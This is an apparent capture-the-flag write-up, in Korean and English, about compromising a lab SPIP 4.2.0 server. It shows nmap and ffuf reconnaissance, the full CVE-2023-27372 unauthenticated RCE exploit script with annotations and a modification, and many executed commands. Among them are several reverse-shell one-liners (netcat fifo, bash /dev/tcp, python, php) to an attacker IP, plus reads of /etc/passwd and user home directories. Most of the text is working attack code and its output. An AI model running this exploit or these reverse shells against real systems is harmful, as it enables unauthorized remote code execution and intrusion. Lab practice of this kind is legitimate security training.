# 10.201.106.230

nmap -Pn -sV -sC -oN nmap.txt --open 10.201.106.230

┌──(root㉿docker-desktop)-[/]
└─# nmap -Pn -sV -sC -oN nmap.txt --open 10.201.106.230
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 15:03 UTC
Nmap scan report for 10.201.106.230
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 7c:7e:2e:2c:f7:c0:c2:65:04:f4:3f:f4:f8:42:af:07 (RSA)
| 256 4b:6e:8e:ff:63:f4:bc:6b:8a:ec:65:97:0f:33:55:40 (ECDSA)
|\_ 256 a7:a3:b7:2f:64:4e:c9:38:10:44:69:58:e1:e8:85:aa (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-title: Publisher's Pulse: SPIP Insights & Tips
|\_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

ffuf -u http://10.201.106.230 -H "Host:FUZZ.10.201.106.230" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 50 -mc 200,302

┌──(root㉿docker-desktop)-[/]
└─# ffuf -u http://10.201.106.230 -H "Host:FUZZ.10.201.106.230" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.201.106.230
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
:: Header : Host: FUZZ.10.201.106.230
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 178

---

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|\_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-server-header: Apache/2.4.41 (Ubuntu)
|\_http-title: Publisher's Pulse: SPIP Insights & Tips
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

![](https://velog.velcdn.com/images/agnusdei1207/post/c9aee363-a145-4492-a058-9d1eabd973c6/image.png)

ffuf -u "http://10.201.106.230/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -fs 0 -fc 404
┌──(root㉿docker-desktop)-[/]
└─# ffuf -u "http://10.201.106.230/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.201.106.230/FUZZ
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

images [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 334ms]
server-status [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 419ms]
spip [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 330ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

![](https://velog.velcdn.com/images/agnusdei1207/post/1857c055-20e8-41ff-a8fa-0947585311cb/image.png)

images, server-status, spip

![](https://velog.velcdn.com/images/agnusdei1207/post/4b46f70a-95d5-4c12-8b5a-47b174ffecf3/image.png)

![](https://velog.velcdn.com/images/agnusdei1207/post/af9a94e6-090f-4696-9601-444fa18824f8/image.png)
http://10.201.106.230/spip/spip.php?page=login&url=spip.php%3Fpage%3Dplan&lang=fr

![](https://velog.velcdn.com/images/agnusdei1207/post/c85edd3d-63d7-4a14-8bc1-cc659a4e2aea/image.png)

- 4.2.0 unauthenticated vulnerable

https://github.com/advisories/GHSA-7w4r-xxr6-xrcj
https://github.com/PaulSec/SPIPScan?source=post_page-----a256af21d7bd---------------------------------------

> apt install exploitdb
> searchsploiot -u
> searchsploit spip

# 10.201.106.230

┌──(root㉿docker-desktop)-[/]
└─# searchsploit spip

---

Exploit Title | Path

---

SPIP - 'connect' PHP Injection (Metasploit) | php/remote/27941.rb
SPIP 1.8.2 - 'Spip_RSS.php' Remote Command Execution | php/webapps/27172.txt
SPIP 1.8.2g - Remote Command Execution | php/webapps/1482.php
SPIP 1.8.3 - 'Spip_login.php' Remote File Inclusion | php/webapps/27589.txt
SPIP 1.8/1.9 - 'index.php3' Cross-Site Scripting | php/webapps/27158.txt
SPIP 1.8/1.9 - Multiple SQL Injections | php/webapps/27157.txt
SPIP 2.1 - 'var_login' Cross-Site Scripting | php/webapps/34388.txt
SPIP 2.x - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/37397.html
SPIP 3.1.1/3.1.2 - File Enumeration / Path Traversal | php/webapps/40596.txt
SPIP 3.1.2 - Cross-Site Request Forgery | php/webapps/40597.txt
SPIP 3.1.2 Template Compiler/Composer - PHP Code Execution | php/webapps/40595.txt
SPIP < 2.0.9 - Arbitrary Copy All Passwords to '.XML' File | php/webapps/9448.py
SPIP CMS < 2.0.23/ 2.1.22/3.0.9 - Privilege Escalation | php/webapps/33425.py
spip v4.1.10 - Spoofing Admin account | php/webapps/51557.txt
SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py

---

# 4.2.0 RCE 취약점 발견

Shellcodes: No Results
Papers: No Results

![](https://velog.velcdn.com/images/agnusdei1207/post/35cf51f8-0267-4bba-8e49-4c8986663cfa/image.png)

SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py

> cat /usr/share/exploitdb/exploits/php/webapps/51536.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# 해당 내용 코드

# Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated)
# Google Dork: inurl:"/spip.php?page=login"
# Date: 19/06/2023
# Exploit Author: nuts7 (https://github.com/nuts7/CVE-2023-27372)
# Vendor Homepage: https://www.spip.net/
# Software Link: https://files.spip.net/spip/archives/
# Version: < 4.2.1 (Except few fixed versions indicated in the description)
# Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0
# CVE reference : CVE-2023-27372 (coiffeur)
# CVSS : 9.8 (Critical)
#
# Vulnerability Description:
#
# SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.
# This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.
#
# Usage: python3 CVE-2023-27372.py http://example.com
import argparse # 명령줄 인자(command-line arguments)를 파싱하기 위해 argparse 모듈을 가져옴.
import bs4 # BeautifulSoup 4 (bs4) 모듈을 가져옴. HTML/XML 문서에서 데이터를 추출(스크래핑)하는 데 사용됨.
import html # HTML 엔티티를 처리하기 위해 html 모듈을 가져옴 (주로 인코딩/디코딩).
import requests # HTTP 요청을 보내기 위해 requests 라이브러리를 가져옴.

def parseArgs():
    # 명령줄 인자를 파싱하는 함수 정의.
    parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7")
    # 스크립트 설명을 설정.
    parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
    # 필수 인자: SPIP 애플리케이션의 기본 URL (Uniform Resource Locator)을 정의.
    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
    # 필수 인자: 서버에서 실행할 명령어를 정의.
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
    # 선택적 인자: 상세 모드(verbose mode) 활성화 여부를 정의.
    return parser.parse_args() # 파싱된 인자들을 반환.

def get_anticsrf(url):
    # Cross-Site Request Forgery (CSRF) 방지 토큰(Anti-CSRF token)을 가져오는 함수 정의.
    # SPIP의 비밀번호 재설정 페이지('/spip.php?page=spip_pass')에 요청을 보냄.
    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
    # 응답 텍스트를 파싱하기 위해 BeautifulSoup 객체를 생성.
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    # HTML에서 이름이 'formulaire_action_args'인 <input> 태그를 찾음. 이 태그에 Anti-CSRF 토큰이 포함되어 있음.
    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf_input:
        # 태그를 찾았다면, 해당 태그의 'value' 속성에서 토큰 값을 추출.
        csrf_value = csrf_input['value']
        if options.verbose:
            # 상세 모드일 경우 토큰 값을 출력.
            print("[+] Anti-CSRF token found : %s" % csrf_value)
        return csrf_value # 토큰 값을 반환.
    else:
        # 토큰을 찾지 못했을 경우 오류 메시지를 출력하고 -1을 반환.
        print("[-] Unable to find Anti-CSRF token")
        return -1

def send_payload(url, payload):
    # 공격 페이로드(payload)를 전송하는 함수 정의.
    data = {
        "page": "spip_pass", # POST 요청의 'page' 인자는 'spip_pass' (비밀번호 재설정 페이지).
        "formulaire_action": "oubli", # 'formulaire_action' 인자는 'oubli' (잊어버림) 액션을 트리거.
        "formulaire_action_args": csrf, # 앞에서 얻은 Anti-CSRF 토큰 값을 사용.
        "oubli": payload # 'oubli' 파라미터에 RCE를 위한 악성 페이로드를 전달.
    }
    # 공격 페이로드를 담은 POST 요청을 해당 URL로 전송.
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        # 상세 모드일 경우 전송된 페이로드를 출력.
        print("[+] Execute this payload : %s" % payload)
    return 0 # 함수 종료.

if __name__ == '__main__':
    # 스크립트가 직접 실행될 때 실행되는 메인 블록.
    options = parseArgs() # 명령줄 인자를 파싱하여 'options' 변수에 저장.

    # HTTPS 요청 시 발생하는 SSL/TLS 경고를 비활성화하는 설정.
    requests.packages.urllib3.disable_warnings()
    # SSL/TLS 암호화 스위트(cipher suite)를 조작하여 특정 환경에서 발생할 수 있는 연결 문제를 회피.
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    try:
        # pyOpenSSL을 사용하는 환경에서도 동일한 암호화 스위트 설정을 시도 (일관성 유지).
        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    except AttributeError:
        pass # pyOpenSSL 관련 속성이 없을 경우 무시.

    # get_anticsrf 함수를 호출하여 Anti-CSRF 토큰을 얻음.
    csrf = get_anticsrf(url=options.url)

    # 최종 페이로드를 생성하고 send_payload 함수를 호출하여 전송.
    # 페이로드 구조: s:길이:"PHP 코드";
    # s:20+len(options.command):"<?php system('사용자 입력 명령어'); ?>";
    # 이는 PHP의 직렬화(serialization) 포맷이며, 'oubli' 파라미터가 역직렬화될 때
    # 악의적인 객체나 코드를 주입하여 원격 코드 실행을 유발하는 Insecure Deserialization 공격 기법을 사용.
    # 'system()' 함수는 인자로 전달된 운영체제(Operating System, OS) 명령어를 실행.
    send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
```

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230 -c "id"
python3: can't open file '/usr/share/exploitdb/exploits/php/webapps/51536': [Errno 2] No such file or directory

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230 -c "id"
Traceback (most recent call last):
File "/usr/share/exploitdb/exploits/php/webapps/51536.py", line 63, in <module>
requests.packages.urllib3.util.ssl*.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: module 'urllib3.util.ssl*' has no attribute 'DEFAULT_CIPHERS'

# 문제있는 코드 주석

──(root㉿docker-desktop)-[/]
└─# vim /usr/share/exploitdb/exploits/php/webapps/51536.py

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230 -c "id"
File "/usr/share/exploitdb/exploits/php/webapps/51536.py", line 66
except AttributeError:
^^^^^^
IndentationError: expected an indented block after 'try' statement on line 64

# 왜 못 찾지?

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230 -c "id"
[-] Unable to find Anti-CSRF token

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230 -c "id" --verbose
[-] Unable to find Anti-CSRF token
[+] Execute this payload : s:22:"<?php system('id'); ?>";

# 직접 input 확인하자 -> 대상에 input 태그가 없네? -> 다른 페이지 찾기 -> 취약점 다시 보기 -> spip.php?page=login

──(root㉿docker-desktop)-[/]
└─# http http://10.201.106.230

# 탐색 -> 안 나옴

┌──(root㉿docker-desktop)-[/]
└─# http http://10.201.106.230/spip.php
HTTP/1.1 404 Not Found
Connection: Keep-Alive
Content-Length: 274
Content-Type: text/html; charset=iso-8859-1
Date: Sat, 08 Nov 2025 09:41:21 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.41 (Ubuntu)

# 초반 ffuf -> /spip 로 가면? -> 결과가 안 보이므로 실패로 판단 -> 로그인 폼 찾기?

![](https://velog.velcdn.com/images/agnusdei1207/post/a9d0fb96-6adf-4e4e-91bb-cf0ea2ae1ad0/image.png)

──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip -c "id" --verbose
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[+] Execute this payload : s:22:"<?php system('id'); ?>";

┌──(root㉿docker-desktop)-[/]
└─# http http://10.201.106.230/spip.php?page=spip_pass
HTTP/1.1 404 Not Found
Connection: Keep-Alive
Content-Length: 274
Content-Type: text/html; charset=iso-8859-1
Date: Sat, 08 Nov 2025 09:54:17 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.41 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.201.106.230 Port 80</address>
</body></html>

# i found it -> spip -> 한 번 더 써야함!

> http http://10.201.106.230/spip/spip.php?page=spip_pass

# input 에 oubli CSRF 토큰이 hidden 처리되어 있음

- AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx

![](https://velog.velcdn.com/images/agnusdei1207/post/2d8bdd5e-9cb6-4a62-941d-3ab620e247bc/image.png)

# not found token

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php?page=spip_pass -c "id" --verbose
[-] Unable to find Anti-CSRF token
[+] Execute this payload : s:22:"<?php system('id'); ?>";

# without queryparam try!

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "id" --verbose
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[+] Execute this payload : s:22:"<?php system('id'); ?>";

# 코드가 실행은 됨 -> 페이로드에서는 전송만 할 뿐 print 하지는 않음 -> modify send_payload method in payload 51536.py

```python
def send_payload(url, payload):
    data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": payload
    }
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        print("[+] Execute this payload : %s" % payload)
        print(r.text) # 한줄 추가

    return 0
```

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "id" --verbose
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[+] Execute this payload : s:22:"<?php system('id'); ?>";

# result in input tag value

> SPIP 취약점 익스플로잇 결과가 <input> 태그의 value 속성에 들어가는 이유는,
> 해당 취약점이 비밀번호 재설정 폼의 이메일 입력값(oubli)을 PHP 코드로 처리하면서
> 명령 실행 결과를 그대로 value에 넣기 때문입니다.
> 즉, 악성 페이로드가 이메일 입력값으로 들어가고,
> 서버에서 system() 함수로 명령을 실행한 뒤
> 그 결과를 다시 이메일 입력값의 value로 반환합니다.

<input type="email" class="text email" autofocus="autofocus" required="required" name='oubli' id='oubli' value="s:22:"uid=33(www-data) gid=33(www-data) groups=33(www-data)

# RS

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose

- bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
- rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f
- nc -lvnp 1234

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose | grep input
<span class="form-hidden"><input name="page" value="spip_pass" type="hidden"
/><input name='formulaire_action' type='hidden'
                value='oubli' /><input name='formulaire_action_args' type='hidden'
                value='AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx' /><input name='formulaire_action_sign' type='hidden'

<input type="email" class="text email" autofocus="autofocus" required="required" name='oubli' id='oubli' value="s:103:"";" 아무것도 오지 않음 autocapitalize="off" autocorrect="off" />
<input type="text" class="text" name="nobot" id="nobot" value="" size="10" />

<p class="boutons"><input type="submit" class="btn submit" value="OK" /></p>

> hint 🔄 다른 역쉘 페이로드 시도 (Alternative Payloads)Netcat(nc) 명령이 대상 서버의 환경(버전, 설치 여부)에 따라 작동하지 않을 수 있습니다.문제점: 대상 서버에 $\text{Netcat}$ 대신 $\text{Bash}$, $\text{Python}$, 또는 $\text{PHP}$만 설치되어 있을 수 있습니다.해결책: 파이썬 스크립트의 -c 플래그에 다른 형태의 역쉘 명령어를 넣어 시도해 보세요

# 환경에 따라 bash, nc, python, php 설치 여부가 다르므로 항상 된다는 보장이 없음 -> 다양한 RS 준비

```sh
# python3
"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'"

# bash
bash -i >& /dev/tcp/10.8.136.212/1234 0>&1

# php
"php -r '$sock=fsockopen(""10.8.136.212"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
```

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "bash -i >& /dev/tcp/10.8.136.212/1234 0>&1" --verbose

# 작은따옴표로 문자열을 감싸서 명령 주입 오류를 피합니다.

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "php -r '$sock=fsockopen(\"10.8.136.212\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" --verbose

# RH ping test -> failed

tcpdump -i tun0 icmp
python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "ping -c 1 10.8.136.212" --verbose

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "ls" --verbose
python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "pwd" --verbose

/home/think/spip/spip

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "ls /home" --verbose
think
python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "ls /home/think" --verbose
spip
python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "ls -al /home/think/spip" --verbose

drwxr-xr-x 11 www-data www-data 4096 Feb 12 2024 .
drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 ..
-rwxr-xr-x 1 www-data www-data 7045 Dec 20 2023 CHANGELOG.md
drwxr-xr-x 3 www-data www-data 4096 Dec 20 2023 IMG
-rwxr-xr-x 1 www-data www-data 35147 Dec 20 2023 LICENSE
-rwxr-xr-x 1 www-data www-data 842 Dec 20 2023 README.md
-rwxr-xr-x 1 www-data www-data 178 Dec 20 2023 SECURITY.md
-rwxr-xr-x 1 www-data www-data 1761 Dec 20 2023 composer.json
-rwxr-xr-x 1 www-data www-data 27346 Dec 20 2023 composer.lock
drwxr-xr-x 3 www-data www-data 4096 Dec 20 2023 config
drwxr-xr-x 22 www-data www-data 4096 Dec 20 2023 ecrire
-rwxr-xr-x 1 www-data www-data 4307 Dec 20 2023 htaccess.txt
-rwxr-xr-x 1 www-data www-data 42 Dec 20 2023 index.php
drwxr-xr-x 5 www-data www-data 4096 Dec 20 2023 local
drwxr-xr-x 22 www-data www-data 4096 Dec 20 2023 plugins-dist
-rwxr-xr-x 1 www-data www-data 3645 Dec 20 2023 plugins-dist.json
drwxr-xr-x 12 www-data www-data 4096 Dec 20 2023 prive
-rwxr-xr-x 1 www-data www-data 973 Dec 20 2023 spip.php
-rwxr-xr-x 1 www-data www-data 1212 Dec 20 2023 spip.png
-rwxr-xr-x 1 www-data www-data 1673 Dec 20 2023 spip.svg
drwxr-xr-x 10 www-data www-data 4096 Dec 20 2023 squelettes-dist
drwxr-xr-x 6 www-data www-data 4096 Nov 9 04:37 tmp
drwxr-xr-x 6 www-data www-data 4096 Dec 20 2023 vendor

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "cat /etc/passwd" --verbose

# think 1000번인걸로 보아 일반 사용자 계정으로 판단 -> 일반적으로 1000부터 시작함 일반 게스트는, 0-> root 관리자

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
think:x:1000:1000::/home/think:/bin/sh

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "id" --verbose

# 현재 www-data 계정

uid=33(www-data) gid=33(www-data) groups=33(www-data)

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "ls -al /" --verbose

drwxr-xr-x 1 root root 4096 Dec 20 2023 .
drwxr-xr-x 1 root root 4096 Dec 20 2023 ..
-rwxr-xr-x 1 root root 0 Dec 20 2023 .dockerenv
lrwxrwxrwx 1 root root 7 Oct 3 2023 bin -> usr/bin
drwxr-xr-x 2 root root 4096 Apr 15 2020 boot
drwxr-xr-x 5 root root 340 Nov 9 04:36 dev
drwxr-xr-x 1 root root 4096 Dec 20 2023 etc
drwxr-xr-x 1 root root 4096 Dec 7 2023 home
lrwxrwxrwx 1 root root 7 Oct 3 2023 lib -> usr/lib
lrwxrwxrwx 1 root root 9 Oct 3 2023 lib32 -> usr/lib32
lrwxrwxrwx 1 root root 9 Oct 3 2023 lib64 -> usr/lib64
lrwxrwxrwx 1 root root 10 Oct 3 2023 libx32 -> usr/libx32
drwxr-xr-x 2 root root 4096 Oct 3 2023 media
drwxr-xr-x 2 root root 4096 Oct 3 2023 mnt
drwxr-xr-x 2 root root 4096 Oct 3 2023 opt
dr-xr-xr-x 172 root root 0 Nov 9 04:36 proc
drwx------ 2 root root 4096 Oct 3 2023 root
drwxr-xr-x 1 root root 4096 Dec 7 2023 run
lrwxrwxrwx 1 root root 8 Oct 3 2023 sbin -> usr/sbin
drwxr-xr-x 2 root root 4096 Oct 3 2023 srv
dr-xr-xr-x 13 root root 0 Nov 9 04:36 sys
drwxrwxrwt 1 root root 4096 Nov 9 04:41 tmp
drwxr-xr-x 1 root root 4096 Oct 3 2023 usr
drwxr-xr-x 1 root root 4096 Dec 7 2023 var

/var

drwxr-xr-x 1 root root 4096 Dec 7 2023 .
drwxr-xr-x 1 root root 4096 Dec 20 2023 ..
drwxr-xr-x 2 root root 4096 Apr 15 2020 backups
drwxr-xr-x 1 root root 4096 Dec 7 2023 cache
drwxr-xr-x 1 root root 4096 Dec 7 2023 lib
drwxrwsr-x 2 root staff 4096 Apr 15 2020 local
lrwxrwxrwx 1 root root 9 Oct 3 2023 lock -> /run/lock
drwxr-xr-x 1 root root 4096 Dec 7 2023 log
drwxrwsr-x 2 root mail 4096 Oct 3 2023 mail
drwxr-xr-x 2 root root 4096 Oct 3 2023 opt
lrwxrwxrwx 1 root root 4 Oct 3 2023 run -> /run
drwxr-xr-x 2 root root 4096 Oct 3 2023 spool
drwxrwxrwt 2 root root 4096 Oct 3 2023 tmp
drwxr-xr-x 3 root root 4096 Dec 7 2023 www

# RH python 2차 시도

python3 -m http.server 8000

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",8000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "bash -i >& /dev/tcp/10.8.136.212/8000 0>&1" --verbose

# 탐색

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "ls -al /home/think" --verbose

drwxr-xr-x 8 think think 4096 Feb 10 2024 .
drwxr-xr-x 1 root root 4096 Dec 7 2023 ..
lrwxrwxrwx 1 root root 9 Jun 21 2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think 220 Nov 14 2023 .bash_logout
-rw-r--r-- 1 think think 3771 Nov 14 2023 .bashrc
drwx------ 2 think think 4096 Nov 14 2023 .cache
drwx------ 3 think think 4096 Dec 8 2023 .config
drwx------ 3 think think 4096 Feb 10 2024 .gnupg
drwxrwxr-x 3 think think 4096 Jan 10 2024 .local
-rw-r--r-- 1 think think 807 Nov 14 2023 .profile
lrwxrwxrwx 1 think think 9 Feb 10 2024 .python_history -> /dev/null
drwxr-xr-x 2 think think 4096 Jan 10 2024 .ssh
lrwxrwxrwx 1 think think 9 Feb 10 2024 .viminfo -> /dev/null
drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 spip
-rw-r--r-- 1 root root 35 Feb 10 2024 user.txt

# flag 1

